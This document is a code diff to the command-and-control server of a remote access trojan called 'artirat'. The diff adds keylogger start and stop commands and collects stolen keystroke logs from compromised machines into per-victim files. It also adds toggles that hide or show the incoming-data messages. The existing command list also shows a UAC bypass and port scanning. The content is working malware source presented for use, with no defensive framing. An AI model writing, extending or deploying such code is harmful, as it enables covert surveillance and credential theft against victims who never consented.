@@ -4,6 +4,7 @@ import base64
 
 import os
 import readline
+import select
 import socket
 import subprocess
 import sys
@@ -25,6 +26,32 @@ CLIENT_CONFIG_DIR = os.path.join(".", "artirat-client", "config")
 SERVER_CONFIG_DIR = os.path.join(PROJECT_DIR, "artirat-server", "config")
 HOSTNAME_PATH = os.path.join(SERVER_CONFIG_DIR, "hostname")
 CLIENT_HOSTNAME_PATH = os.path.join(CLIENT_CONFIG_DIR, "hostname")
+STREAM_CONFIG_PATH = os.path.join(BASE_DIR, "stream_config.txt")
+
+_stream_hidden = False
+
+
+def _load_stream_config():
+    global _stream_hidden
+    try:
+        with open(STREAM_CONFIG_PATH) as f:
+            val = f.read().strip()
+            _stream_hidden = val == "hidden"
+    except FileNotFoundError:
+        _stream_hidden = False
+
+
+def _save_stream_config():
+    try:
+        with open(STREAM_CONFIG_PATH, "w") as f:
+            f.write("hidden" if _stream_hidden else "visible")
+    except Exception:
+        pass
+
+
+def _stream_msg(msg: str):
+    if not _stream_hidden:
+        print(msg)
 
 
 class ClientManager:
@@ -162,6 +189,8 @@ CLIENT_COMMANDS = [
     "check_elevated",
     "self_uac",
     "portscan",
+    "keylogger_start",
+    "keylogger_stop",
     "exit", "quit",
     "background",
 ]
@@ -223,7 +252,41 @@ def interactive_session(manager: ClientManager, conn, addr, cid: int, read_initi
             hostname = hostname_full
         manager.set_hostname(cid, hostname)
         print(init_text, end="", flush=True)
+
+    def _drain_pending():
+        try:
+            conn.setblocking(0)
+            data = b""
+            try:
+                while True:
+                    try:
+                        chunk = conn.recv(16384)
+                        if not chunk:
+                            break
+                        data += chunk
+                    except BlockingIOError:
+                        break
+            finally:
+                conn.setblocking(1)
+            if not data:
+                return None, None
+            out = data.decode(errors="replace")
+            return parse_file_response(out)
+        except:
+            return None, None
+
     while True:
+        kfname, kfdata = _drain_pending()
+        if kfname == "keylog.txt" and kfdata:
+            client_dir = manager.get_client_dir(cid)
+            if client_dir:
+                safe_hostname = manager.client_hostnames.get(cid, f"client_{cid}")
+                log_path = os.path.join(client_dir, f"keylog_{safe_hostname}.txt")
+                with open(log_path, "ab") as f:
+                    f.write(kfdata)
+                _stream_msg(f"\n[Keylogger data appended ({len(kfdata)} bytes)]")
+            continue
+
         try:
             line = input(prompt)
         except (EOFError, KeyboardInterrupt):
@@ -290,7 +353,13 @@ def interactive_session(manager: ClientManager, conn, addr, cid: int, read_initi
             fname, fdata = parse_file_response(out_clean)
             if fname and fdata:
                 client_dir = manager.get_client_dir(cid)
-                if client_dir:
+                if fname == "keylog.txt" and client_dir:
+                    safe_hostname = manager.client_hostnames.get(cid, f"client_{cid}")
+                    log_path = os.path.join(client_dir, f"keylog_{safe_hostname}.txt")
+                    with open(log_path, "ab") as f:
+                        f.write(fdata)
+                    _stream_msg(f"[Keylogger data appended ({len(fdata)} bytes)]")
+                elif client_dir:
                     save_path = os.path.join(client_dir, fname)
                     with open(save_path, "wb") as f:
                         f.write(fdata)
@@ -545,7 +614,7 @@ def c2_completer(text, state, manager=None):
     if manager is None:
         return None
     CMD2 = {"select", "build"}
-    CMD1 = {"list", "exit"}
+    CMD1 = {"list", "exit", "hide_stream", "show_stream"}
     ALL_CMDS = CMD1 | CMD2 | {"multi_run"}
     line = readline.get_line_buffer()
     parts = line.split()
@@ -652,6 +721,15 @@ def c2_menu(manager: ClientManager):
                 print("[+] All builds finished")
             else:
                 build_client(target_arg, verbose=verbose, static=static, upx=upx)
+        elif cmd == "hide_stream":
+            global _stream_hidden
+            _stream_hidden = True
+            _save_stream_config()
+            print("[Stream messages hidden]")
+        elif cmd == "show_stream":
+            _stream_hidden = False
+            _save_stream_config()
+            print("[Stream messages visible]")
         elif cmd == "multi_run":
             if len(parts) < 2:
                 print("Usage: multi_run <command>")
@@ -709,6 +787,7 @@ def write_hostname(hostname: str):
 
 
 def run_c2_server():
+    _load_stream_config()
     manager = ClientManager()
     threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
     time.sleep(0.3)
